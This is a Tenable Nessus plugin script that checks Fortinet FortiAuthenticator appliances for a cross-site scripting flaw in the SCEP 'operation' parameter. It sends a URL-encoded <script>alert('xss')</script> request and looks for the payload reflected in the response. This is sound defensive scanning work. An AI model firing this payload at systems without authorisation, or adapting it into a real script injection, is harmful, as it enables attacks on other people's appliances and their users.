#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81383);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/02/16 22:37:06 $");

  script_cve_id(
    "CVE-2015-1455",
    "CVE-2015-1456",
    "CVE-2015-1457",
    "CVE-2015-1458",
    "CVE-2015-1459"
  );
  script_bugtraq_id(72378);
  script_osvdb_id(117731);

  script_name(english:"Fortinet FortiAuthenticator 'operation' Parameter XSS");
  script_summary(english:"Checks for cross-site scripting vulnerability.");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Fortinet FortiAuthenticator appliance is affected by a
cross-site scripting vulnerability due to improper validation of input
to the 'operation' parameter of the SCEP service.

Appliances affected by this issue are likely affected by multiple
other issues that; however, Nessus did not test for these. See the
linked advisory for further details.");
  # http://www.security-assessment.com/files/documents/advisory/Fortinet_FortiAuthenticator_Multiple_Vulnerabilities.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?78acca25");
  script_set_attribute(attribute:"solution", value:
"The vendor has yet to release a patch. As a workaround, restrict
access to the appliance.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:fortinet:fortiauthenticator");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("fortiauthenticator_webapp_detect.nbin");
  script_require_ports("Services/www", 443);
  script_require_keys("installed_sw/Fortinet FortiAuthenticator");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Fortinet FortiAuthenticator";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443);

install = get_single_install(
  app_name : app,
  port     : port
);

exp_req = '/cert/scep/?operation=%22%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E';

res = http_send_recv3(port         : port,
                      method       : 'GET',
                      item         : exp_req,
                      exit_on_fail : TRUE);

if('500' >< res[0] &&
   res[2] =~ "^Unknown\s*operation\s*:" &&
   "<script>alert('xss')</script>" >< res[2])
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  if(report_verbosity > 0)
  {
    report = '\nNessus was able to demonstrate the vulnerability with the following request :\n';
    report += '\n  ' + build_url(port:port, qs:exp_req) + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Fortinet FortiAuthenticator", build_url(port:port, qs:"/"));
